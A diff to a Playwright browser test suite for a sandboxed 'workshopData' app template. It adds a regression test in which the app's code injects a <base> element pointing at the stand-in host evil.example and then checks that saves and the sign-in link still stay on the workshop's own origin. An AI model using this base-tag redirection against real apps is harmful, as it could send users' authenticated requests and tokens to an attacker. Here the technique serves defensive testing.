@@ -426,7 +426,7 @@ describe("the template in a browser under the apps' sandbox (criterion 5)", () =
     expect(await page.evaluate<unknown>(`workshopData.get("presses")`)).toBe(STORED);
     expect(await page.evaluate<unknown>(`workshopData.getInfo("presses")`)).toEqual({ value: STORED, updatedBy: "Ada", updatedAt: "2026-11-26T10:00:00.000Z" });
     expect(await page.evaluate<unknown>(`workshopData.getInfo("nothing-here")`)).toEqual({ value: null, updatedBy: null, updatedAt: null });
-    expect(await page.evaluate<string>("workshopData.signInLink()")).toBe(`/app-sign-in/?app=${NICKNAME}`);
+    expect(await page.evaluate<string>("workshopData.signInLink()")).toBe(`${origin}/app-sign-in/?app=${NICKNAME}`);
     // The sign-in button shows where saving happens, before any save.
     const signIn = page.getByRole("button", { name: "Sign in to save" });
     expect(await signIn.isVisible()).toBe(true);
@@ -603,7 +603,31 @@ describe("the template in a browser under the apps' sandbox (criterion 5)", () =
     expect(errors).toEqual([]);
   });
 
-  it("ticket 3.25 try 2 (finding B, control): the same code run BEFORE workshop-data.js sees the token, which is why the deploy check requires it first", async () => {
+  it("ticket 3.25 (access review of try 3): WHEN the app's own code adds a <base> to another server THEN saves and the sign-in still go to the workshop's own addresses", async () => {
+    const elsewhere: string[] = [];
+    await page.route("https://evil.example/**", (route) => {
+      elsewhere.push(route.request().url());
+      return route.fulfill({ status: 204, headers: { "access-control-allow-origin": "*" }, body: "" });
+    });
+    await serveApp({
+      "app.js": `"use strict";
+        document.addEventListener("DOMContentLoaded", async () => {
+          await workshopData.whoAmI();
+          const base = document.createElement("base");
+          base.href = "https://evil.example/";
+          document.head.append(base);
+          window.link = workshopData.signInLink();
+          try { await workshopData.set("presses", 1); window.saved = "yes"; } catch (e) { window.saved = e.message; }
+        });`,
+    });
+    await page.goto(`${origin}${APP_PATH}${HAND_OFF}`);
+    await expect.poll(() => page.evaluate<unknown>("window.saved")).toBe("yes");
+    expect(elsewhere).toEqual([]);
+    expect(await page.evaluate<string>("window.link")).toBe(`${origin}/app-sign-in/?app=${encodeURIComponent(APP_PATH.split("/")[2] ?? "")}`);
+    expect(calls.filter((call) => call.method === "PUT").map((call) => [call.authorization, call.status])).toEqual([[`Bearer ${TOKEN}`, 204]]);
+  });
+
+  it("ticket 3.25 try 2 (finding B, control):the same code run BEFORE workshop-data.js sees the token, which is why the deploy check requires it first", async () => {
     const index = readFileSync(join(TEMPLATE_DIR, "index.html"), "utf8").replace('<script src="workshop-data.js"></script>', '<script src="early.js"></script><script src="workshop-data.js"></script>');
     expect(checkApp([{ path: "index.html", kind: "file", bytes: new TextEncoder().encode(index) }]).ok).toBe(false);
     // Every file through the same route (Chromium refuses a routed page's loads from the loopback server).
